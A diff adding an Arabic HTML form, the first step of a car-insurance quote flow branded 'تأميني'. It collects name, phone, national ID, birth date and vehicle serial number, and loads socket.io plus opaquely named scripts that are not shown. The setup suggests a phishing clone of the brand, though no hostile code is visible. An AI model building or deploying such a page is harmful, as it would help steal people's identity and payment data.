@@ -1,0 +1,123 @@
+<!DOCTYPE html>
+
+<html dir="rtl" lang="ar">
+<head>
+<meta charset="utf-8"/>
+<meta content="width=device-width, initial-scale=1.0" name="viewport"/>
+<title>تأميني - البيانات الأساسية</title>
+
+<link href="https://fonts.googleapis.com/css2?family=Cairo:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="css/stylea.css">
+
+</head>
+<body>
+<div class="app">
+<header>
+<div class="logo">
+<div class="logo-icon" style="display:flex;align-items:center;justify-content:center;padding:0;overflow:hidden;"><img alt="تأميني" src="images/logo.png" style="width:100%;height:100%;object-fit:cover;display:block;"/></div>
+<span>تأميني</span>
+</div>
+<a class="login-link" href="index.html#">تسجيل الدخول</a>
+</header>
+<div class="stepper">
+<div class="step active" data-step="1">
+<div class="step-number">1</div>
+<span>البيانات الأساسية</span>
+</div>
+<div class="step" data-step="2">
+<div class="step-number">2</div>
+<span>بيانات التأمين</span>
+</div>
+<div class="step" data-step="3">
+<div class="step-number">3</div>
+<span>قائمة الأسعار</span>
+</div>
+<div class="step" data-step="4">
+<div class="step-number">4</div>
+<span>الإضافات</span>
+</div>
+<div class="step" data-step="5">
+<div class="step-number">5</div>
+<span>الملخص والدفع</span>
+</div>
+</div>
+<main>
+<h1>الغرض من التأمين</h1>
+<form id="formStep1" novalidate="">
+
+<span class="label">نوع العرض</span>
+<div class="segmented" id="offerType">
+<button class="active" data-value="new" type="button">تأمين جديد</button>
+<button data-value="transfer" type="button">نقل الملكية</button>
+</div>
+
+<span class="label">نوع تسجيل المركبة</span>
+<div class="segmented" id="regType">
+<button class="active" data-value="serial" type="button">الرقم التسلسلي</button>
+<button data-value="customs" type="button">بطاقة جمركية [استيراد]</button>
+</div>
+
+<div class="field">
+<label class="label" for="userName">الاسم الكامل</label>
+<input id="userName" name="userName" placeholder="أدخل اسمك الكامل" type="text"/>
+<div class="error" id="userNameError"></div>
+</div>
+
+<div class="field">
+<label class="label" for="phoneNumber">رقم الهاتف</label>
+<input id="phoneNumber" name="phoneNumber" placeholder="05xxxxxxxx" type="tel" maxlength="10" inputmode="numeric" autocomplete="tel" style="direction: ltr; text-align: right;"/>
+<div class="error" id="phoneNumberError"></div>
+</div>
+
+<div class="field">
+<label class="label" for="idNumber">رقم الهوية</label>
+<input id="idNumber" inputmode="numeric" name="idNumber" maxlength="10" placeholder="رقم الهوية الوطنية أو الإقامة أو الشركة" type="text"/>
+<div class="error" id="idError"></div>
+</div>
+
+<div class="field transfer-only hidden">
+<label class="label" for="birthDate">تاريخ الميلاد</label>
+<input id="birthDate" name="birthDate" type="date"/>
+<div class="error" id="birthDateError"></div>
+</div>
+
+<div class="field">
+<label class="label" for="serialNumber">الرقم التسلسلي</label>
+<input id="serialNumber" name="serialNumber" placeholder="الرقم التسلسلي للمركبة" type="text"/>
+<div class="error" id="serialError"></div>
+</div>
+
+<div class="field transfer-only hidden">
+<label class="label" for="carYear">سنة الصنع</label>
+<input id="carYear" name="carYear" placeholder="اختر سنة الصنع" type="number"/>
+<div class="error" id="carYearError"></div>
+</div>
+<p class="info-text">
+        بالضغط على التالي، أوافق على منح تأميني الحق في الاستعلام عن بياناتي وبيانات مركبتي من الجهات المعنية لأجل إصدار التسعيرة.
+      </p>
+<div class="buttons-row">
+<button class="btn btn-primary" type="submit">التالي</button>
+</div>
+</form>
+</main>
+</div>
+
+<script src="https://cdn.socket.io/4.6.1/socket.io.min.js"></script>
+<script src="js/ind.js"></script>
+<script src="js/e9s1.js"></script>
+<script src="js/kn5k.js"></script>
+<div class="loading-screen" id="loadingScreen">
+<div class="loading-content">
+<div class="loading-dots">
+<div></div>
+<div></div>
+<div></div>
+<div></div>
+</div>
+<div class="loading-text" id="loadingText">جاري التحميل...</div>
+<div class="loading-subtext" id="loadingSubtext">يرجى الانتظار</div>
+</div>
+</div>
+
+</body>
+</html>
